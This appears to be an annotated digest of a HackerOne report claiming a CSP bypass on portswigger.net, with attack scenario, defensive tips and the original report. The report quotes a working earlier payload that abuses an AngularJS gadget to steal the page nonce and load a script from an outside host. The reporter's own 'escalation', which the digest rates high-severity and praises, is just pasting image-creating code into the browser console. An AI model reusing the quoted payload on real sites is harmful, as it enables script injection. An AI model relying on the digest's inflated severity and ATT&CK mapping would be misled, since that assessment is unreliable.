# CSP Bypass Escalation via Image Element Injection

## Metadata
- **Source:** HackerOne
- **Report:** 2387458 | https://hackerone.com/reports/2387458
- **Submitted:** 2024-02-23
- **Reporter:** priyanshusharma9789
- **Program:** PortSwigger (HackerOne)
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Content Security Policy Bypass, DOM-based XSS, Insufficient CSP Configuration
- **CVEs:** None
- **Category:** business-logic

## Summary
A Content Security Policy bypass vulnerability exists due to incomplete CSP directives that fail to restrict image element sources. An attacker can escalate a previously reported CSP bypass by injecting arbitrary content through dynamically created img elements, circumventing existing script-src restrictions.

## Attack scenario
1. Attacker identifies that the target website's CSP header lacks proper img-src or default-src restrictions
2. Attacker injects malicious JavaScript code that creates a new img element with attacker-controlled src attribute
3. The injected code clears the document body using innerHTML and appends the image element
4. The image element is rendered with attacker-controlled content, potentially exfiltrating data or serving malicious content
5. By varying the img src URL, attacker can load arbitrary resources without triggering CSP violations
6. Attacker leverages this vector to escalate to full XSS or data exfiltration attacks

## Root cause
The website's Content Security Policy configuration is incomplete and does not properly restrict img-src directives. While script-src was hardened against the previous bypass technique, the CSP failed to implement comprehensive default-src restrictions or img-src policies, leaving image elements as an unrestricted attack surface.

## Attacker mindset
Methodical CSP enumeration - when one bypass vector is patched, the attacker systematically tests alternative HTML elements (img, iframe, embed, etc.) to find remaining unrestricted resource types. Demonstrates understanding that CSP directives must be comprehensive across all content types, not just scripts.

## Defensive takeaways
- Implement a strict default-src 'self' directive as a fallback for all unspecified resource types
- Explicitly define img-src, media-src, font-src, and other resource directives rather than relying on script-src alone
- Use CSP Level 3 features like require-trusted-types to prevent DOM-based XSS
- Regularly audit CSP headers using automated tools (e.g., CSP evaluators) to identify gaps
- Test CSP bypass techniques across multiple HTML elements and content types during security testing
- Apply nonce-based or hash-based CSP for inline scripts rather than relaxed unsafe-inline directives
- Implement HTML sanitization and Content Security Policy as defense-in-depth layers

## Variant hunting
Test bypass techniques using alternative elements: <audio src>, <video src>, <source>, <track>, <link>, <meta>, and <form action> attributes. Verify CSP directives for frame-src, object-src, base-uri, and form-action. Explore DOM clobbering and namespace pollution vectors.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1055 - Process Injection
- T1566 - Phishing (if combined with social engineering)

## Notes
Report demonstrates common CSP configuration errors where organizations patch specific attack vectors without comprehensively reviewing all CSP directives. The PortSwigger target suggests this is a learning/intentional vulnerable platform. The reference to previous report #2279346 indicates iterative vulnerability discovery. Researcher methodology of testing alternative elements after initial patch is exemplary for CSP bypass research.

## Full report
<details><summary>Expand</summary>

Hello Team , 

I have gone through this report https://hackerone.com/reports/2279346 and their is CSP bypass where website has implemented security in that but after this i can escalate Again CSP bypass with using different Script .

As shown in https://hackerone.com/reports/2279346 report website rectify the scripts like: 

document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//joaxcar.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`


But their is new way where i can escalate the bug with new script which is : 

var demo=document.createElement("img");
demo.src="https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"; 
document.body.innerHTML="";demo.width="1000"; demo.height="1000";
document.body.appendChild(demo);

F3074920


Steps: 
Go to https://portswigger.net/
Inject the script in console tab and see the impact

In this website configuration on CSP header is not proper . In my attachment their is no header for img in CSP . So attacker can escalate the bug again with different scripts.
F3074919

Thanks 
Priyanshu

## Impact

Escalate the bug with new script

CSP bypass using img script.

</details>

---
*Analysed by Claude on 2026-05-24*
